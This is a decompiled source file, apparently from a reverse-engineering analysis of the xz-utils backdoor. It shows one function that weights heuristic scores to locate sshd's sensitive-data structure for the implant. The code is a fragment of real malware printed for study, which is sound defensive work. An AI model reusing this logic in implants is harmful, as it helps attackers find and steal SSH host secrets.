// /home/kali/xzre-ghidra/xzregh/103D50_sshd_get_sensitive_data_score.c
// Function: sshd_get_sensitive_data_score @ 0x103D50
// Calling convention: unknown
// Prototype: undefined sshd_get_sensitive_data_score(void)


/*
 * AutoDoc: Combines the three per-function heuristics with weighting: `demote_sensitive_data` and `main`
 * scores get doubled and added together, then the `do_child` score is tacked on. Candidates must
 * exceed the global threshold (>=8) before the pointer is published to the rest of the implant.
 */
#include "xzre_types.h"


int sshd_get_sensitive_data_score
              (long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int score_do_child;
  int score_main;
  int score_demote;
  
  if (param_1 != 0) {
    iVar1 = sshd_get_sensitive_data_score_in_demote_sensitive_data();
    iVar2 = sshd_get_sensitive_data_score_in_main(param_1,param_2,param_3,param_4);
    iVar3 = sshd_get_sensitive_data_score_in_do_child(param_1,param_2,param_3,param_4);
    return iVar3 + (iVar1 + iVar2) * 2;
  }
  return 0;
}

